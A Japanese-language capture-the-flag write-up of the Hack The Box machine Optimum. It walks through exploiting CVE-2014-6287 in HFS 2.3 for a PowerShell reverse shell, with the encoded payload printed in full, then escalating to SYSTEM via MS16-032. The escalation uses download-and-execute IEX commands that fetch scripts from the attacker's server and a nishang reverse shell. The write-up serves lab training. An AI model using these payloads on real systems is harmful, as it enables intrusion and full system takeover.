https://app.hackthebox.com/machines/Optimum
## STEP 1
80番がオープン
```sh
└─$ rustscan -a 10.129.16.57 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.16.57:80
10.129.16.57 -> [80]
```


## STEP 2
80番にアクセス  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Optimum_01.png">  
http file server 2.3 には CVE-2014-6287 が存在し、「Search」の部分にヌル文字列を介したRCEができる  
PoCがあったので使用する
```sh
└─$ searchsploit -m 49584            
  Exploit: HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)
      URL: https://www.exploit-db.com/exploits/49584
     Path: /usr/share/exploitdb/exploits/windows/remote/49584.py
    Codes: N/A
 Verified: False
File Type: ASCII text, with very long lines (546)
Copied to: /home/kali/49584.py
```
PoC修正
```sh
lhost = "10.10.14.109"
lport = 4444
rhost = "10.129.8.79"
rport = 80
```
PoC実行、リバースシェル取得！
ユーザフラグゲット！ルートフラグは権限足りず
```sh
└─$ python3.13 49584.py

Encoded the command in base64 format...

Encoded the payload and sent a HTTP GET request to the target...

Printing some information for debugging...
lhost:  10.10.14.109
lport:  4444
rhost:  10.129.8.79
rport:  80
payload:  exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAwADkAIgAsADQANAA0ADQAKQA7ACAAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAIABbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7ACAAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsADAALAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAgACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAJABpACkAOwAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABHAGUAdAAtAEwAbwBjAGEAdABpAG8AbgApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACAAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA

Listening for connection...
listening on [any] 4444 ...
connect to [10.10.14.109] from (UNKNOWN) [10.129.8.79] 49158

PS C:\Users\kostas\Desktop> whoami
optimum\kostas

PS C:\Users\kostas\Desktop> type user.txt
0459b60dcc7d0c54a66b36d6b09189a8
```


## STEP 3
`Sherlock.ps1`で権限昇格を探す
```sh
└─$ wget -nv https://raw.githubusercontent.com/rasta-mouse/Sherlock/refs/heads/master/Sherlock.ps1
2025-04-28 04:11:39 URL:https://raw.githubusercontent.com/rasta-mouse/Sherlock/refs/heads/master/Sherlock.ps1 [16663/16663] -> "Sherlock.ps1" [1]

└─$ python3.13 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
`MS16-032`がエクスプロイトできそう
```powershell
PS C:\Users\kostas\Desktop> iex(new-object net.webclient).downloadstring('http://10.10.16.3/Sherlock.ps1')

PS C:\Users\kostas\Desktop> Find-AllVulns

Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Not Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Not Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?
VulnStatus : Appears Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
VulnStatus : Appears Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html
VulnStatus : Not Vulnerable
```
powreshellempireのPoCをKaliのwebサーバにアップロード  
またエクスプロイト時に実行させるリバースシェル用のスクリプト、今回はnishangのやつもリスナーのIPアドレスを更新してアップロード
```sh
└─$ cp /usr/share/powershell-empire/empire/server/data/module_source/privesc/Invoke-MS16032.ps1 .

└─$ cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 .

└─$ python3.13 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
一行目のコマンドで関数「Invoke-MS16032」がロードされ、２行目でリバースシェルスクリプトをエクスプロイト後のsystem権限で実行するかんじ  
エクスプロイト失敗
```powershell
PS C:\Users\kostas\Desktop> IEX(new-object net.webclient).downloadstring('http://10.10.14.70/Invoke-MS16032.ps1')

PS C:\Users\kostas\Desktop> Invoke-MS16032 -Command "IEX(new-object net.webclient).downloadstring('http://10.10.14.70/Invoke-PowerShellTcpOneLine.ps1')"
     __ __ ___ ___   ___     ___ ___ ___ 
    |  V  |  _|_  | |  _|___|   |_  |_  |
    |     |_  |_| |_| . |___| | |_  |  _|
    |_|_|_|___|_____|___|   |___|___|___|
                                        
                   [by b33f -> @FuzzySec]
[!] No valid thread handles were captured, exiting!
```
現在のプロセスが64ビットかどうか確認すると32ビットであることが判明！
```powershell
PS C:\Users\kostas\Desktop> [Environment]::Is64BitProcess
False
```
どうやら32ビットアプリケーションからパス指定なしでpowershellを実行すると32ビットPowershellになるらしい  
そうなると32ビットPowershellから64ビットアプリケーションを実行できなくなる  
おろらくhttpfileserverは32ビットで動作しているため、リバースシェルのpowershellも32ビットが動作しているっぽい  
[このサイト](https://ss64.com/nt/syntax-64bit.html)から、32ビットから64ビットPowershellを実行するときは`C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe`を実行すればよいとわかった  
ということでPoCのペイロードを修正して実行、今度は64ビットPowershellをゲット
```sh
└─$ python3.13 49584.py
/home/kali/49584.py:32: SyntaxWarning: invalid escape sequence '\W'
  payload = f'exec|C:\Windows\sysnative\WindowsPowerShell\\v1.0\powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_command}'

Encoded the command in base64 format...

Encoded the payload and sent a HTTP GET request to the target...

Printing some information for debugging...
lhost:  10.10.14.109
lport:  4444
rhost:  10.129.8.79
rport:  80
payload:  exec|C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAwADkAIgAsADQANAA0ADQAKQA7ACAAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAIABbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7ACAAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsADAALAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAgACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAJABpACkAOwAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABHAGUAdAAtAEwAbwBjAGEAdABpAG8AbgApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACAAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA

Listening for connection...
listening on [any] 4444 ...
connect to [10.10.14.109] from (UNKNOWN) [10.129.8.79] 49196

PS C:\Users\kostas\Desktop> [Environment]::Is64BitProcess
True
```
再度PoC実行、うまくいったぽい
```powershell
PS C:\Users\kostas\Desktop> IEX(new-object net.webclient).downloadstring('http://10.10.14.70/Invoke-MS16032.ps1')

PS C:\Users\kostas\Desktop> Invoke-MS16032 -Command "IEX(new-object net.webclient).downloadstring('http://10.10.14.70/Invoke-PowerShellTcpOneLine.ps1')"
     __ __ ___ ___   ___     ___ ___ ___ 
    |  V  |  _|_  | |  _|___|   |_  |_  |
    |     |_  |_| |_| . |___| | |_  |  _|
    |_|_|_|___|_____|___|   |___|___|___|
                                        
                   [by b33f -> @FuzzySec]

[!] Holy handle leak Batman, we have a SYSTEM shell!!
```
新たにSYSTEM権限でリバースシェル取得成功！  
ルートフラグゲット！
```sh
└─$ rlwrap nc -lnvp 5555
listening on [any] 5555 ...

connect to [10.10.14.70] from (UNKNOWN) [10.129.6.249] 49193
PS C:\Users\kostas\Desktop> whoami
nt authority\system

PS C:\Users\kostas\Desktop> type C:\Users\Administrator\Desktop\root.txt
38d6aba1726a0d9481e7074f106a8f9c
```
